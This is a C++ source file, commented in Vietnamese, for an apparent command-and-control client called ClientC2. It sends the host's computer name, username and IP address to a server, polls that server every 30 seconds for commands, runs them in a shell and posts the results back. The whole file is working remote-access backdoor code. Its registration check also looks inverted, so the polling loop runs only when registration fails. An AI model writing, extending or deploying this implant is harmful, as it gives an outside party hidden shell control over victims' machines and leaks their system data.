#define _WIN32_WINNT 0x0A00

#include <openssl/sha.h>

#include "chrono"
#include "httplib.h"
#include "iostream"
#include "nlohmann\json.hpp"
#include "regex"
#include "string"

using namespace std;

using json = nlohmann::json;

class ClientC2 {
 private:
  string clientID;
  httplib::Client cli;
  string serverAdress;
  int serverPort;

  // Tạo clientId bằng cách băm systeminfo dùng sha256 và lấy 12hex đầu
  string generateClientId() {
    string sysinfo = getSystemInfo().dump();

    unsigned char sha256_result[SHA256_DIGEST_LENGTH];
    SHA256(reinterpret_cast<const unsigned char*>(sysinfo.c_str()),
           sysinfo.size(), sha256_result);

    string id;
    char buf[3];
    for (int i = 0; i < 6; i++) {  // 6 bytes = 12 hex chars
      snprintf(buf, sizeof(buf), "%02X", sha256_result[i]);
      id += buf;
    }
    return id;
  }

  json getSystemInfo() {
    json info;
#if defined(_WIN32)
    info["os"] = "Windows";
    // Láy tên máy tính
    char computerName[256];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size)) {
      info["computer_name"] = computerName;
    }
    // Láy tên người dùng
    char username[256];
    DWORD username_len = sizeof(username);
    if (GetUserNameA(username, &username_len)) {
      info["username"] = username;
    }
    // Lấy địa chỉ IP
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) == 0) {
      char host[256];
      if (gethostname(host, sizeof(host)) == 0) {
        struct hostent* phe = gethostbyname(host);
        if (phe) {
          struct in_addr addr;
          memcpy(&addr, phe->h_addr_list[0], sizeof(struct in_addr));
          info["ip_address"] = inet_ntoa(addr);
        }
      }
      WSACleanup();
    }
#elif defined(__linux__) || defined(__APPLE__)
#if defined(__linux__)
    info["os"] = "Linux";
#else
    info["os"] = "macOS";
#endif
    // Láy tên máy tính
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
      info["computer_name"] = hostname;
    }
    // Láy tên người dùng
    const char* username = getenv("USER");
    if (username) {
      info["username"] = username;
    }
    // Lấy địa chỉ IP
    struct addrinfo hints = {}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(hostname, nullptr, &hints, &res) == 0 && res) {
      char ipstr[INET_ADDRSTRLEN];
      struct sockaddr_in* ipv4 = (struct sockaddr_in*)res->ai_addr;
      inet_ntop(AF_INET, &(ipv4->sin_addr), ipstr, sizeof(ipstr));
      info["ip_address"] = ipstr;
      freeaddrinfo(res);
    }
#else
    info["os"] = "Unknown";
#endif
    return info;
  }

  string executeCommand(const std::string& cmd) {
    array<char, 128> buffer;
    string result;
    unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);

    if (!pipe) {
      return "[Err] Error executing command";
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
      result += buffer.data();
    }

    return result;
  }

 public:
  ClientC2(const string& server, int port)
      : serverAdress(server), serverPort(port), cli(server, port) {
    this->clientID = generateClientId();
  }

  bool registerClient() {
    json j = getSystemInfo();
    j["client_id"] = this->clientID;
    auto res = cli.Post("/register", j.dump(), "application/json");
    return !(res && res->status == 200);
  }

  void start() {
    if (!registerClient()) {
      // báo lên server vẫn sống sau mỗi 30s
      while (true) {
        json heartJ;
        heartJ["client_id"] = this->clientID;
        auto res = cli.Post("/heartbeat", heartJ.dump(), "application/json");

        json response = json::parse(res->body);
        cout << "[NOT] response after heart" << response.dump() << '\n';

        // Nếu có lệnh trên server thì tiến hành thực hiện
        if (response.contains("commands") && !response["commands"].empty()) {
          for (auto command : response["commands"]) {
            cout << "[NOT] execute command " << command << '\n';

            json resultData;
            resultData["client_id"] = this->clientID;
            resultData["commands"] = command;
            resultData["result"] = executeCommand(command);

            cli.Post("/result", resultData.dump(), "application/json");
          }
        } else {
          cout << "[NOT] no commands found!\n";
        }

        this_thread::sleep_for(std::chrono::seconds(30));
      }
    } else {
      cout << "[Err] can't not register to server";
    }
  }
};

int main() {
  ClientC2 client("0.0.0.0", 8888);
  client.start();
}